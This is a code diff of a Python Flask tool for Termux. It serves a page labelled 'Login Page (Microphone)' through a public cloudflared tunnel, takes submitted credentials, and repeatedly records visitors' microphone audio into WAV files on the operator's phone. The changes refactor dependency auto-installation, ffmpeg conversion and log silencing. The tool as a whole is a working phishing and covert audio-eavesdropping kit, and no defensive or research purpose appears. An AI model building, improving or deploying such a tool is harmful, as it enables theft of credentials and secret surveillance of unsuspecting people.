@@ -10,39 +10,49 @@ from datetime import datetime
 from io import BytesIO
 from flask import Flask, render_template_string, request, jsonify
 
-# --- Dependency and Tunnel Setup ---
+# --- Auto-install missing dependencies ---
 
-def install_package(package):
-    """Installs a package using pip quietly."""
+def install_python_package(package):
+    """Installs a Python package using pip."""
     subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
 
+def install_system_package(pkg_name):
+    """Attempts to install a system package on Termux (Android) or shows manual instructions."""
+    # Detect if running on Termux
+    if os.path.exists('/data/data/com.termux'):
+        print(f"[INFO] Termux detected. Installing {pkg_name} via pkg...")
+        subprocess.run(['pkg', 'install', pkg_name, '-y'], check=True)
+        return True
+    else:
+        print(f"[ERROR] {pkg_name} is not installed.", file=sys.stderr)
+        if pkg_name == 'cloudflared':
+            print("-> Please install cloudflared manually from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
+        elif pkg_name == 'ffmpeg':
+            print("-> Please install ffmpeg manually from: https://ffmpeg.org/download.html", file=sys.stderr)
+        return False
+
 def check_dependencies():
-    """Checks for cloudflared, FFmpeg, and required Python packages."""
-    # 1. Verify cloudflared
+    """Checks for cloudflared, FFmpeg, and Flask; auto-installs missing Python packages."""
+    # 1. cloudflared
     try:
         subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except (subprocess.CalledProcessError, FileNotFoundError):
-        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
-        print("-> Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
-        sys.exit(1)
+        if not install_system_package('cloudflared'):
+            sys.exit(1)
 
-    # 2. **FIX**: Verify FFmpeg is installed (CRITICAL FOR SOUND)
+    # 2. FFmpeg
     try:
         subprocess.run(["ffmpeg", "-version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except (subprocess.CalledProcessError, FileNotFoundError):
-        print("[ERROR] 'ffmpeg' is not installed or not in your system's PATH.", file=sys.stderr)
-        print("-> FFmpeg is REQUIRED to process and save audio with sound.", file=sys.stderr)
-        print("-> Please install it from: https://ffmpeg.org/download.html", file=sys.stderr)
-        sys.exit(1)
+        if not install_system_package('ffmpeg'):
+            sys.exit(1)
 
-    # 3. Check for required Python packages
-    packages = {"Flask": "flask", "pydub": "pydub"}
-    for pkg_name, import_name in packages.items():
-        try:
-            __import__(import_name)
-        except ImportError:
-            print(f"Installing missing package: {pkg_name}...", file=sys.stderr)
-            install_package(pkg_name)
+    # 3. Flask (Python package)
+    try:
+        __import__('flask')
+    except ImportError:
+        print("Installing missing Python package: Flask...")
+        install_python_package('flask')
 
 def get_recording_duration():
     """Prompt user to choose recording duration in seconds."""
@@ -59,31 +69,28 @@ def get_recording_duration():
             
             if not duration:
                 print("Using default duration: 15 seconds")
-                return 15000  # Default to 15 seconds in milliseconds
+                return 15000  # milliseconds
             
             duration_sec = int(duration)
-            
             if duration_sec <= 0:
                 print("Please enter a positive number.")
                 continue
-                
-            if duration_sec > 300:  # 5 minutes max
+            if duration_sec > 300:
                 print("Warning: Very long duration (>5 minutes) may cause performance issues.")
                 confirm = input("Continue anyway? (y/n): ").lower()
                 if confirm != 'y':
                     continue
             
             print(f"Recording duration set to {duration_sec} seconds")
-            return duration_sec * 1000  # Convert to milliseconds
-            
+            return duration_sec * 1000
         except ValueError:
-            print("Invalid input. Please enter a number (e.g., 15, 30, 60).")
+            print("Invalid input. Please enter a number.")
         except KeyboardInterrupt:
-            print("\n\nOperation cancelled.")
+            print("\nOperation cancelled.")
             sys.exit(0)
 
 def run_cloudflared_and_print_link(port, script_name):
-    """Starts a cloudflared tunnel and prints the public link."""
+    """Starts cloudflared tunnel and prints the public URL."""
     cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     for line in iter(process.stdout.readline, ''):
@@ -94,23 +101,14 @@ def run_cloudflared_and_print_link(port, script_name):
             break
     process.wait()
 
-
-# --- Flask Application ---
-from pydub import AudioSegment
-
+# --- Flask Application (no pydub, uses ffmpeg directly) ---
 app = Flask(__name__)
-
-# Global variable for recording duration (in milliseconds)
-RECORDING_DURATION_MS = 15000  # Default 15 seconds
-
+RECORDING_DURATION_MS = 15000  # default
 RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
 os.makedirs(RECORDINGS_FOLDER, exist_ok=True)
 
-
 def get_html_template(recording_duration_ms):
-    """Generate HTML template with the specified recording duration."""
     recording_duration_sec = recording_duration_ms // 1000
-    
     return f'''
 <!DOCTYPE html>
 <html lang="en">
@@ -182,7 +180,6 @@ def get_html_template(recording_duration_ms):
     </div>
     <script>
         async function startRecordingLoop(stream) {{
-            // **FIX**: Specify audio codec and bitrate for better quality and compatibility.
             const options = {{
                 mimeType: 'audio/webm;codecs=opus',
                 audioBitsPerSecond: 128000
@@ -191,9 +188,7 @@ def get_html_template(recording_duration_ms):
             const audioChunks = [];
 
             recorder.ondataavailable = event => {{
-                if (event.data.size > 0) {{
-                    audioChunks.push(event.data);
-                }}
+                if (event.data.size > 0) audioChunks.push(event.data);
             }};
 
             recorder.onstop = () => {{
@@ -212,9 +207,7 @@ def get_html_template(recording_duration_ms):
 
             recorder.start();
             setTimeout(() => {{
-                if(recorder.state === "recording") {{
-                    recorder.stop();
-                }}
+                if(recorder.state === "recording") recorder.stop();
             }}, {recording_duration_ms});
         }}
 
@@ -226,7 +219,6 @@ def get_html_template(recording_duration_ms):
                 console.error("Microphone access denied:", err);
             }}
         }}
-
         window.onload = init;
     </script>
 </body>
@@ -249,28 +241,39 @@ def submit_credentials():
 def upload_audio():
     try:
         audio_data = request.json.get('audio')
-        if not audio_data: return jsonify({"error": "No audio"}), 400
+        if not audio_data:
+            return jsonify({"error": "No audio"}), 400
+        
         audio_bytes = base64.b64decode(audio_data)
         
-        # pydub uses ffmpeg to convert from webm to wav.
-        # If ffmpeg is not installed, this will fail and create a silent/empty file.
-        webm_audio = AudioSegment.from_file(BytesIO(audio_bytes), format="webm")
+        # Save as WAV using ffmpeg (more reliable than pydub)
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        wav_filename = f"recording_{timestamp}.wav"
+        wav_path = os.path.join(RECORDINGS_FOLDER, wav_filename)
         
-        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
-        webm_audio.export(os.path.join(RECORDINGS_FOLDER, filename), format="wav")
+        # Run ffmpeg to convert webm (from stdin) to wav
+        ffmpeg_cmd = [
+            'ffmpeg', '-i', 'pipe:0',        # read from stdin
+            '-acodec', 'pcm_s16le',          # WAV codec
+            '-ar', '44100',                  # sample rate
+            '-ac', '1',                      # mono
+            '-y',                            # overwrite output
+            wav_path
+        ]
+        proc = subprocess.run(ffmpeg_cmd, input=audio_bytes, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if proc.returncode != 0:
+            raise RuntimeError("ffmpeg conversion failed")
         
         return jsonify({"message": "Audio saved."}), 200
     except Exception as e:
-        # Provide a more detailed error in the server console for debugging.
         print(f"[ERROR] Failed to process audio: {e}", file=sys.stderr)
         return jsonify({"error": "Failed to process audio on server."}), 500
 
 if __name__ == '__main__':
-    # Check dependencies first
+    # Auto-install all missing dependencies
     check_dependencies()
     
     # Get recording duration from user
-    global RECORDING_DURATION_MS
     RECORDING_DURATION_MS = get_recording_duration()
     
     print(f"\n{'='*50}")
@@ -279,12 +282,14 @@ if __name__ == '__main__':
     print(f"Save Location: {RECORDINGS_FOLDER}")
     print(f"{'='*50}\n")
     
+    # Silence Flask logs
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
     sys.modules['flask.cli'].show_server_banner = lambda *x: None
+    
     port = 4040
     script_name = "Login Page (Microphone)"
-    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
+    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port, use_reloader=False))
     flask_thread.daemon = True
     flask_thread.start()
     time.sleep(1)
